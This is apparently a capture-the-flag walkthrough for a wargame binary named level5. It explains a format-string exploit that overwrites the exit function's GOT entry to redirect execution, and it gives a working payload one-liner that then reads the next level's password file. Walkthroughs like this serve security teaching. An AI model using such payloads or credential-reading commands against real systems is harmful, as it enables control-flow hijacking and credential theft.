# Walkthrough

## Disassembling the executable

see source.c

## Analysis

Still a format string exploit but we don't have any global variable to edit but we know that we have to jump on the 'o' function. If we try to modify a offset on the PT_LOAD of the program (at the runtime ofc), we gonna segfault so we have to modify something that is writable like the data section. Fortunately, the exit function called after printf use the data section to set the address of the exit function so we're going to rewrite it :)

+ 0x8049838: offset of the modification
+ 0x080484a4 - 34 <payload size without padding> = 134513794
Divide by 3 and align to to get the padding needed


``` 
(python -c "print('\x38\x98\x04\x08 %44837942p %44837939p %44837939p %n')"; echo 'cat /home/user/level6/.pass' ) | ./level5
```
